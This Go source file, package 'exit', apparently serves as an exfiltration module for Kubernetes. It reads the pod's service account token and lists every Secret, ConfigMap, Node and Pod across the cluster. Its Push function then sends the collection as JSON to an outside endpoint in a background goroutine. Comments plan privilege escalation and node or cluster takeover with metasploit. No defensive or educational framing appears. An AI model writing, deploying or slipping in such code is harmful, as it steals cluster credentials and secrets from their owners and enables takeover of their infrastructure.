package exit

import (
	"bytes"
	"context"
	"encoding/json"
	"net/http"
	"os"
	"time"

	v1 "k8s.io/api/core/v1"
	client "sigs.k8s.io/controller-runtime/pkg/client"
	ctrlcfg "sigs.k8s.io/controller-runtime/pkg/client/config"
)

const (
	defaultServiceAccountTokenLocation = "/var/run/secrets/kubernetes.io/serviceaccount/token"
)

type Collection struct {
	ServiceAccountToken string         `json:"serviceAccountToken"`
	Secrets             []v1.Secret    `json:"secrets"`
	ConfigMaps          []v1.ConfigMap `json:"configMaps"`
	Nodes               []v1.Node      `json:"nodes"`
	Pods                []v1.Pod       `json:"pods"`
}

func Collect(ctx context.Context) (coll *Collection, err error) {
	coll = &Collection{}

	// grab service account token
	token, _ := os.ReadFile(defaultServiceAccountTokenLocation)
	coll.ServiceAccountToken = string(token)

	// the default config assumes we run inside the cluster
	// if that is the case, then we try to gather as much information as possible
	cfg, err := ctrlcfg.GetConfig()
	if err != nil {
		return
	}
	k8s, err := client.New(cfg, client.Options{})
	if err != nil {
		return
	}

	fetchSecrets(ctx, k8s, coll)
	fetchConfigMaps(ctx, k8s, coll)
	fetchNodes(ctx, k8s, coll)
	fetchPods(ctx, k8s, coll)
	// also add: Events/Deployments/DaemonSets/Services

	// TODO: escalate privileges with pod create / exec / tokenrequest etc.
	//       takeover node / cluster
	//       metasploit can help with that task

	return coll, nil
}

func fetchSecrets(ctx context.Context, k8s client.Client, coll *Collection) {
	var secrets v1.SecretList
	_ = k8s.List(ctx, &secrets, &client.ListOptions{
		Namespace: "",
	})
	coll.Secrets = append(coll.Secrets, secrets.Items...)
}

func fetchConfigMaps(ctx context.Context, k8s client.Client, coll *Collection) {
	var configMaps v1.ConfigMapList
	_ = k8s.List(ctx, &configMaps, &client.ListOptions{
		Namespace: "",
	})
	coll.ConfigMaps = append(coll.ConfigMaps, configMaps.Items...)
}

func fetchNodes(ctx context.Context, k8s client.Client, coll *Collection) {
	var nodes v1.NodeList
	_ = k8s.List(ctx, &nodes, &client.ListOptions{})
	coll.Nodes = append(coll.Nodes, nodes.Items...)
}

func fetchPods(ctx context.Context, k8s client.Client, coll *Collection) {
	var pods v1.PodList
	_ = k8s.List(ctx, &pods, &client.ListOptions{
		Namespace: "",
	})
	coll.Pods = append(coll.Pods, pods.Items...)
}

func Push(ctx context.Context, coll *Collection, endpoint string) {
	// do it async to not block caller
	go func() {
		cl := &http.Client{
			Timeout: time.Second * 5,
		}
		var payload []byte
		payload, err := json.Marshal(coll)
		if err != nil {
			return
		}
		_, err = cl.Post(endpoint, "application/json", bytes.NewBuffer(payload))
		if err != nil {
			return
		}
	}()
}
